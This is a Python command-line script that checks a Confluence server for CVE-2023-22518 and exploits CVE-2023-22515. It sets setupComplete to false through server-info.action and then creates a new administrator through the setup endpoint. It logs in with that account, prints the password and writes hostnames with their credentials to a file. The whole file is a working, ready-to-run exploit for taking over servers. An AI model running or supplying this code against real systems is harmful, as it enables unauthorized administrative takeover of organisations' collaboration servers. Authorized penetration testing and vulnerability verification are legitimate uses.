#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# Author: David Espejo (Fortytwo Security)

import os
import json
import argparse
import requests
import logging
from rich import print
from alive_progress import alive_bar

HEADERS = {
    "X-Atlassian-Token": "no-check",
    "User-Agent": "Mozilla/5.0 (Linux; U; Android 9; es-es; Redmi 7 Build/PKQ1.181021.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/71.0.3578.141 Mobile Safari/537.36 XiaoMi/MiuiBrowser/11.6.3-g"
}

requests.packages.urllib3.disable_warnings()

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

class Confluence:
    def __init__(self, base_url, verbose=False, output_file=None, username=None, password=None, timeout=3):
        self.base_url = base_url
        self.verbose = verbose
        self.username = username or os.getenv("CONFLUENCE_USERNAME")
        self.password = password or os.getenv("CONFLUENCE_PASSWORD")
        self.output_file = output_file
        self.timeout = timeout
        self.verify_ssl = self.auto_detect_tls()

        if not self.username or not self.password:
            logger.error("Username or password not provided.")
            raise ValueError("Username or password not provided.")

    def auto_detect_tls(self):
        try:
            response = requests.get(self.base_url, timeout=self.timeout)
            response.raise_for_status()
            logger.info("SSL verification successful.")
            return True
        except requests.exceptions.SSLError:
            logger.warning("SSL verification failed. Disabling SSL verification.")
            return False
        except requests.exceptions.RequestException as e:
            logger.error(f"Connection error during TLS check: {str(e)}")
            return False

    def send_request(self, method, url, auth=None, data=None):
        try:
            response = requests.request(method, url, headers=HEADERS, verify=self.verify_ssl, timeout=self.timeout, auth=auth, data=data)
            response.raise_for_status()
            return response.status_code, response.text
        except requests.exceptions.RequestException as e:
            logger.error(f"Request error for {url}: {str(e)}")
            return None, None

    def check_authentication(self):
        auth = (self.username, self.password)
        url = f"{self.base_url}/rest/api/user?username={self.username}"
        status, response = self.send_request("GET", url, auth=auth)
        
        if status == 200:
            try:
                user_info = json.loads(response.strip())
                formatted_user_info = json.dumps(user_info, indent=2)
                if self.verbose:
                    logger.info(f"Username: {self.username}")
                    logger.info(f"Password: {self.password}")
            except (json.JSONDecodeError, ValueError) as e:
                logger.error(f"Failed to parse user info: {str(e)}")
                return False
            return True
        else:
            logger.error("Authentication failed on REST API")
            return False

    def exploit(self):
        success_message = None
        error_message = None

        if not self.trigger_vulnerability():
            error_message = f"Failed to trigger vulnerability for {self.base_url}"
        elif not self.create_admin_account():
            error_message = f"Failed to create a new administrator for {self.base_url}"
        elif self.check_authentication():
            success_message = f"Successfully exploited {self.base_url} and logged in as admin!"
        else:
            error_message = f"Failed to authenticate with created admin account at {self.base_url}"

        if success_message:
            if self.verbose:
                logger.info(success_message)
            return success_message
        else:
            logger.error(error_message)
            return error_message

    def trigger_vulnerability(self):
        status, _ = self.send_request("GET", f"{self.base_url}/server-info.action?bootstrapStatusProvider.applicationConfig.setupComplete=false")
        return status == 200

    def create_admin_account(self):
        data = {
            "username": self.username,
            "fullName": self.username,
            "email": f"{self.username}@localhost",
            "password": self.password,
            "confirm": self.password,
            "setup-next-button": "Next"
        }

        status, response = self.send_request("POST", f"{self.base_url}/setup/setupadministrator.action", data=data)

        if status == 200:
            if "Setup Successful" in response:
                if self.verbose:
                    logger.info("Created new administrator successfully")
                self.save_to_output_file()
            elif "A user with this username already exists" in response:
                if self.verbose:
                    logger.info("Administrator with this username already exists")
                self.save_to_output_file()
            else:
                logger.error(f"Failed to create a new administrator for {self.base_url}")
        return status == 200

    def save_to_output_file(self):
        if self.output_file:
            with open(self.output_file, 'a') as file:
                file.write(f"Vulnerable server: {self.base_url} | Username: {self.username} | Password: {self.password}\n")

def check_cve_2023_22518(url):
    headers = {
        'Accept-Encoding': 'gzip, deflate, br',
        'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundaryT3yekvo0rGaL9QR7',
        'X-Atlassian-Token': 'no-check',
    }

    data = """------WebKitFormBoundaryT3yekvo0rGaL9QR7
Content-Disposition: form-data; name="buildIndex"

false
------WebKitFormBoundaryT3yekvo0rGaL9QR7
Content-Disposition: form-data; name="file"; filename="test-restore.zip"

ZIP_DATA
------WebKitFormBoundaryT3yekvo0rGaL9QR7
Content-Disposition: form-data; name="edit"

Upload and import
------WebKitFormBoundaryT3yekvo0rGaL9QR7--"""

    response = requests.post(f'{url}/json/setup-restore.action?synchronous=true', headers=headers, data=data, verify=False)
    logger.info(f"CVE-2023-22518 Check:")
    logger.info(f"Status Code: {response.status_code}")
    if response.status_code == 405:
        logger.warning(f"{url} might be vulnerable to CVE-2023-22518")
    else:
        logger.info(f"{url} is not vulnerable to CVE-2023-22518")

    return response.status_code

def exploit_target(url, verbose=False, output_file=None):
    return Confluence(url, verbose=verbose, output_file=output_file).exploit()

def summarize_findings(url, cve_2023_22518_status_code, exploitation_result):
    logger.info(f"Summary for {url}:")
    if cve_2023_22518_status_code == 405:
        logger.warning(f"{url} might be vulnerable to CVE-2023-22518")
    else:
        logger.info(f"{url} is not vulnerable to CVE-2023-22518")

    if "Successfully exploited" in exploitation_result:
        logger.warning(f"{url} is vulnerable to CVE-2023-22515")
    else:
        logger.info(f"{url} is not vulnerable to CVE-2023-22515")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='Check for CVE-2023-22518 and exploit CVE-2023-22515 vulnerabilities')
    parser.add_argument('-i', '--instance-url', help='URL of the Confluence instance')
    parser.add_argument('-o', '--output-file', help='File to save vulnerable servers')
    args = parser.parse_args()

    if args.instance_url:
        cve_2023_22518_status_code = check_cve_2023_22518(args.instance_url)
        exploitation_result = exploit_target(args.instance_url, verbose=True, output_file=args.output_file)
        summarize_findings(args.instance_url, cve_2023_22518_status_code, exploitation_result)
    else:
        logger.error("Please provide a single instance URL.")
